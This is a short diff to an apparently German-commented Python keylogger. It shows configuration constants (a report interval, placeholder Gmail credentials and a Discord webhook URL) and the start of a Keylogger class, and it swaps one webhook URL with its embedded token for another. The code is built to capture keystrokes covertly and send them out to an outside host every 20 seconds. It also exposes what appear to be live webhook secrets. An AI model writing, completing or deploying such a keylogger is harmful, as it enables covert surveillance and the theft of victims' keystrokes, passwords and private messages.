@@ -8,7 +8,7 @@ import requests  # Für Discord-Webhook
 SEND_REPORT_EVERY = 20 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "deine.email@gmail.com"  # Ersetze mit deiner Gmail-Adresse
 EMAIL_PASSWORD = "dein-app-passwort"  # Ersetze mit deinem Gmail-App-Passwort (nicht dem normalen Passwort)
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1433066545784819736/abmFKt0qVERXl8Xh5KDbG80VLchYp1Xtoll7y9XKFj8B9ynQPPt8CLUPSHSUx6fXKzBX"  # Ersetze mit deiner Webhook-URL
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1433072215401824358/f95HWyiUinYpyysS0MA7NUuSPFs1Ute71SLQ0hEYYvebxsCoQam850qtTGwHRDbR2yg3"  # Ersetze mit deiner Webhook-URL
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
